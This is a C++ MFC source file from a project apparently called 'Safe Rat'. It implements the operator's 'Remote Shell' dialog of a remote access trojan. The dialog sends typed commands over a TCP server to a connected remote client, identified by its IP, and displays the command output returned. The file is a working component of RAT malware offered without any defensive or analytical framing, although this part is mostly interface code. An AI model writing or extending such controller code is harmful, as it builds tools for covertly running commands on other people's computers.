// CShellDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CShellDlg.h"
#include "afxdialogex.h"

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_SHELL_DLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_CMD));
	m_bOnClose = FALSE;

}

CShellDlg::~CShellDlg()
{
	 DestroyIcon(m_hIcon);

}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT1, &CShellDlg::OnEnChangeEdit1)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	str.Format("%s - Remote Shell", m_pContext->m_RemoteIP);
	SetWindowText(str);

	// 设置最大长度
	m_edit.SetLimitText(MAXDWORD); 
	// 设置主题
	m_edit.SetTheme(xtpControlThemeUltraFlat);
	// 设置字体
	font.CreatePointFont(120, _T("等线"));
	m_edit.SetFont(&font);
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  
}

void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}


void CShellDlg::AddKeyBoardData()
{
	//获取执行结果
	CString strResult;
	strResult += (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);

}

void CShellDlg::OnClose()
{

	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}


void CShellDlg::PostNcDestroy()
{
	
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;

}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			//获取cmd窗口文本长度
			int	len = m_edit.GetWindowTextLength();
			//获取字符串
			CString str;
			m_edit.GetWindowText(str);

			//追加换行
			str += "\r\n";
			//发送执行
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (IsWindowVisible())
		ResizeEdit();
	// TODO: 在此处添加消息处理程序代码
}


void CShellDlg::OnEnChangeEdit1()
{
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
}




HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT1) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}
